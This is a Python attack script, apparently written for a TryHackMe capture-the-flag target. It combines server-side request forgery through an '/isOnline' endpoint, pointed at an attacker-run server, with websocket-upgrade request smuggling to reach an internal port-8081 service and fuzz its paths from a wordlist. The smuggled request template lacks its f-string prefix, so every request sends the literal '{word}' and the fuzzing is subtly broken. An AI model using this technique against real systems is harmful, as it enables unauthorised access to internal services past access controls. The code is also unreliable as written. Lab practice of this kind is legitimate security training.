import requests
import sys

def send_request(word):
    url = "http://bandito.public.thm:8080/isOnline"
    params = {
        "url": f"http://10.21.33.143:8000"
    }
    headers = {
        "Host": "bandito.public.thm:8080",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Upgrade": "websocket"
    }
    data = (
        "GET /{word} HTTP/1.1\r\n"
        "Host: bandito.public.thm:8081\r\n\r\n"
    )

    response = requests.get(url, params=params, headers=headers, data=data)
    return response

def main(wordlist_file):
    with open(wordlist_file, 'r') as file:
        for line in file:
            word = line.strip()
            if word:
                response = send_request(word)
                print(f"Word: {word}, Status Code: {response.status_code}, Response: {response.text}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <wordlist_file>")
        sys.exit(1)

    wordlist_file = sys.argv[1]
    main(wordlist_file)

